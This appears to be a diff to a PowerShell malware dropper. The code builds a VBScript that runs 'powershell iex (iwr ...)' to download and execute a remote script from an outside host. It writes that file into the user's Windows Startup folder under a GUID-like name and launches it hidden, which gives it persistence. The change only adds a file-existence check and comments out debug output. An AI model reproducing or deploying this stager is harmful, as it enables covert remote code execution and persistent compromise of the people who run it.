@@ -5,6 +5,12 @@ strArgs = "cmd.exe /c powershell.exe iex (iwr -uri http://sovr.ml/setup.txt -use
 oShell.Run strArgs, 0, false
 "@
 
-write-host $data
-add-content -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs" -Encoding ASCII -value $data
-start-process -windowstyle Hidden "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs"
+#write-host $data
+
+if (!test-path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs"){
+    #write-host "X"
+}
+else{
+    add-content -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs" -Encoding ASCII -value $data
+    start-process -windowstyle Hidden "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs"
+}
